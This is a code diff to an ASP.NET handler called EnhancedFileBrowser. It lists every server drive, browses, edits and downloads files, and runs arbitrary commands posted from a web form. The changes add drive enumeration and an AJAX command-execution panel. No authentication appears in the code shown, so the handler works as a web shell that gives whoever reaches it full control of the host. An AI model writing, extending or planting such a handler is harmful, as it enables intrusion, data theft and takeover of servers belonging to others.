@@ -7,7 +7,7 @@ using System.Diagnostics;
 
 public class EnhancedFileBrowser : IHttpHandler
 {
-    private const string DefaultFolder = @"C:\"; // Default directory if no path supplied
+    private const string DefaultFolder = @"C:\"; // Change as per your server environment
 
     public void ProcessRequest(HttpContext context)
     {
@@ -66,8 +66,46 @@ public class EnhancedFileBrowser : IHttpHandler
                 var url = '?action=editform&path=' + encodeURIComponent(path);
                 window.location.href = url;
             }
-        </script>");
+            function toggleDrives() {
+                var d = document.getElementById('drivesList');
+                if(d.style.display === 'none' || d.style.display === '') d.style.display = 'block';
+                else d.style.display = 'none';
+            }
+            // ajax submit for command exec
+            function executeCommand(event) {
+                event.preventDefault();
+                var form = event.target;
+                var xhr = new XMLHttpRequest();
+                var formData = new FormData(form);
+                xhr.open('POST', form.action, true);
+                xhr.onload = function() {
+                    if(xhr.status === 200) {
+                        document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';
+                    }
+                };
+                xhr.send(formData);
+            }
+            </script>");
         html.Append("</head><body>");
+
+        // Drives list toggle button and container
+        html.Append(@"<button onclick='toggleDrives()' style='margin-bottom:10px;padding:5px 10px;'>Toggle Drives List</button>");
+        html.Append(@"<div id='drivesList' style='display:none;border:1px solid #ccc;padding:10px;margin-bottom:15px;background:#f9f9f9;'>");
+
+        try
+        {
+            string[] drives = Environment.GetLogicalDrives();
+            foreach(string drive in drives)
+            {
+                string encodedDrive = HttpUtility.UrlEncode(drive);
+                html.Append($"<a href='?path={encodedDrive}' style='margin-right:15px;font-weight:bold;'>{drive}</a>");
+            }
+        }
+        catch(Exception)
+        {
+            // swallow
+        }
+        html.Append("</div>");
 
         html.Append("<nav>");
         html.Append("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
@@ -80,7 +118,7 @@ public class EnhancedFileBrowser : IHttpHandler
             html.Append($"<p>{message}</p>");
         }
 
-        html.Append($"<div id='browseTab' class='tab active'>");
+        html.Append("<div id='browseTab' class='tab active'>");
         html.Append(RenderFileBrowser(context, currentPath));
         html.Append("</div>");
 
@@ -161,7 +199,7 @@ public class EnhancedFileBrowser : IHttpHandler
                         }
                     }
                 case "editform":
-                    return null; // handled in Render
+                    return null;
                 case "saveedit":
                     {
                         string filePath = context.Request["path"];
@@ -208,7 +246,6 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
-
         sb.Append(@"<form method='get'>
             <input type='hidden' name='action' value='newfolder'/>
             <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
@@ -303,11 +340,13 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append("<h2>Command Execution</h2>");
-        sb.Append(@"<form method='post'>
+        sb.Append($@"<form method='post' action='EnhancedFileBrowser.ashx' onsubmit='executeCommand(event)'>
             <input type='hidden' name='action' value='cmdexec'/>
             <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
             <input type='submit' value='Run Command'/>
             </form><hr/>");
+
+        sb.Append("<div id='cmdOutput'>");
 
         if (context.Request.HttpMethod == "POST" && context.Request["action"] == "cmdexec")
         {
@@ -315,11 +354,12 @@ public class EnhancedFileBrowser : IHttpHandler
             if (!string.IsNullOrEmpty(cmd))
             {
                 string output = ExecuteCmd(cmd);
-                sb.Append("<h3>Output:</h3><pre style='background:#eee;padding:10px;'>");
+                sb.Append("<pre style='background:#eee;padding:10px;'>");
                 sb.Append(HttpUtility.HtmlEncode(output));
                 sb.Append("</pre>");
             }
         }
+        sb.Append("</div>");
 
         return sb.ToString();
     }
@@ -372,7 +412,7 @@ public class EnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // will not reach here
+            return null;
         }
         catch (Exception ex)
         {
